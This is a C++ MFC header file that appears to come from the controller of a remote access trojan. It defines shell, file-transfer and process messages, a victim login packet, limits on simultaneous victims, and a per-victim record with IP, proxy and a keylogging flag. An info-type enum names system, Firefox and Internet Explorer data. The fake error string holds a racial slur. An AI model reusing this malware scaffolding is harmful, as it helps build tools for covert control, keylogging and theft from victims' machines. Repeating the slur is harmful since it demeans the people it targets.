// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__5EE21B9B_FBB6_456D_8E97_7A6703200EA6__INCLUDED_)
#define AFX_STDAFX_H__5EE21B9B_FBB6_456D_8E97_7A6703200EA6__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers

#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT

#include <afxsock.h>		// MFC socket extensions



#define WM_NET_MESSAGE  (WM_APP + 1)
#define WM_NEW_SHELL_MESSAGE  (WM_APP + 2)
#define WM_NEW_INFO_MESSAGE  (WM_APP + 3)
#define WM_NEW_FILE_MESSAGE  (WM_APP + 4)
#define WM_NEW_INOUT_FILE_MESSAGE_NEWSTEP (WM_APP + 5)
#define WM_NEW_INOUT_FILE_MESSAGE_FINISHED (WM_APP + 6)
#define WM_NEW_INOUT_FILE_MESSAGE_ERROR (WM_APP + 7)
#define WM_NEW_PROCESS_MESSAGE (WM_APP + 8)

#define WM_LOST_CONNECTION (WM_APP + 99)

// variables
#define MAX_BUFF_SIZE				256
#define MAX_RECEIVE_BUFFER			4096
#define MAX_WAITING_CONNECTIONS		8
#define DEFAULT_PING_INTERVAL		50 // sec
#define DEFAULT_LISTEN_PORT			6667
#define DEFAULT_TRANSFER_PORT		5556
#define DEFAULT_VICTIM_LOGIN_PACKET	"login"
#define DEFAULT_MAX_SIM_VICTIMS		32
#define MAX_SIM_VICTIMS				512
#define MAX_LINES					128
#define DEFAULT_TRANSMIT_TIMEOUT	10
#define DEFAULT_PROXY_PORT			8080
#define DEFAULT_PROXY_TIMEOUT		120
#define DEFAULT_SERVER_NAME			"TxTxTx"
#define DEFAULT_SERVER_NAME_SIZE	32
#define DEFAULT_SERVER_FAKEERROR	"FuckYouNigga"
#define DEFAULT_SERVER_FAKEERROR_SIZE 128

extern int		ListenPort;
extern int		PingInterval;
extern int		MaxSimVictims;
extern int		TransferPort;
extern char		VictimLoginPacket[32];
extern CString	NetMessage;
extern char		MsgBoxText[MAX_BUFF_SIZE];
extern UINT		CurrentSelection;
extern CString	NewText[MAX_LINES];
extern CRITICAL_SECTION		cs;

typedef struct
{
	int		id;
	SOCKET	sock;
	char	ip[16];
	char	name[32];
	unsigned long	psent;
	unsigned long	ping;
	bool	bkeylogging;
	char	proxy[16];
	char	pversion[8];
	HWND	hWnd;
} CNETSTRUCT;

typedef enum
{
	SYSTEMINFO,
	FF,
	IE
} infotype_s;

extern CNETSTRUCT	cndata[MAX_SIM_VICTIMS];

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.



#endif // !defined(AFX_STDAFX_H__5EE21B9B_FBB6_456D_8E97_7A6703200EA6__INCLUDED_)
